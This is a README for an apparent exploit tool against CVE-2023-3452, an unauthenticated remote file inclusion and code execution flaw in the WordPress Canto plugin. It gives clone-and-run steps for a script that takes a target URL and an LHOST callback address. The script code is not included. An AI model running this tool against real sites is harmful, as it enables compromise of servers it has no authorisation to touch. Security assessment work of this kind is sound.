# Canto Remote File Inclusion (RFI) and Remote Code Execution (RCE) Exploit

This tool exploits the Remote File Inclusion (RFI) and Remote Code Execution (RCE) vulnerability in the WordPress plugin Canto, allowing attackers to execute arbitrary code on the target server.

## Description

The Canto plugin for WordPress is vulnerable to Remote File Inclusion in versions up to, and including, 3.0.4 via the 'wp_abspath' parameter. This allows unauthenticated attackers to include and execute arbitrary remote code on the server, provided that `allow_url_include` is enabled. This exploit tool automates the exploitation process, making it easier for security professionals to assess and mitigate the vulnerability.

## Usage

1. Clone the repository:

  `git clone https://github.com/0x1x02/Canto-RFI-RCE-Exploit.git`

2. Navigate to the project directory:

  `cd Canto-RFI-RCE-Exploit`

3. Run the exploit script:

  `python3 CVE-2023-3452.py -u <target_url> -LHOST <local_host>`


Replace `<target_url>` with the URL of the vulnerable WordPress site running the Canto plugin and `<local_host>` with the IP address of your local machine.
